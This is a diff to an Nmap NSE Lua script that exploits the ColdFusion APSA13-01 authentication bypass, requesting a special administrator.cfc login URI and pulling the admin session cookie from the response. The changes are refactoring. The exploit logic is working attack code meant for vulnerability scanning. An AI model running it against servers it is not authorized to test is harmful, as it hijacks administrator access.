@@ -1,5 +1,9 @@
 description = [[
-Attempts to exploit an authentication bypass vulnerability in Adobe Coldfusion servers (APSA13-01: http://www.adobe.com/support/security/advisories/apsa13-01.html) to retrieve a valid administrator's session cookie.
+Attempts to exploit an authentication bypass vulnerability in Adobe Coldfusion
+servers to retrieve a valid administrator's session cookie.
+
+Reference:
+* APSA13-01: http://www.adobe.com/support/security/advisories/apsa13-01.html
 ]]
 
 ---
@@ -17,13 +21,13 @@ Attempts to exploit an authentication bypass vulnerability in Adobe Coldfusion s
 ---
 
 author = "Paulino Calderon <calderon@websec.mx>"
-license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
+license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
 categories = {"exploit", "vuln"}
 
 local http = require "http"
 local shortport = require "shortport"
 local stdnse = require "stdnse"
-local string = require "string"
+local url = require "url"
 
 portrule = shortport.http
 local DEFAULT_PATH = "/CFIDE/adminapi/"
@@ -32,13 +36,13 @@ local MAGIC_URI = "administrator.cfc?method=login&adminpassword=&rdsPasswordAllo
 -- Extracts the admin cookie by reading CFAUTHORIZATION_cfadmin from the header 'set-cookie'
 --
 local function get_admin_cookie(host, port, basepath)
-  local req = http.get(host, port, basepath..MAGIC_URI)
-  if req.header['set-cookie'] then
-    stdnse.print_debug(1, "%s:Header 'set-cookie' detected in response.", SCRIPT_NAME)
-    local _, _, admin_cookie = string.find(req.header['set-cookie'], ";path=/, CFAUTHORIZATION_cfadmin=(.*);path=/")
-    if admin_cookie:len() > 79 then
-      stdnse.print_debug(1, "%s: Extracted cookie:%s", SCRIPT_NAME, admin_cookie)
-      return admin_cookie
+  local req = http.get(host, port, url.absolute(basepath, MAGIC_URI))
+  if not req then return nil end
+  for _, ck in ipairs(req.cookies or {}) do
+    stdnse.debug2("Set-Cookie for %q detected in response.", ck.name)
+    if ck.name == "CFAUTHORIZATION_cfadmin" and ck.value:len() > 79 then
+      stdnse.debug1("Extracted cookie:%s", ck.value)
+      return ck.value
     end
   end
   return nil
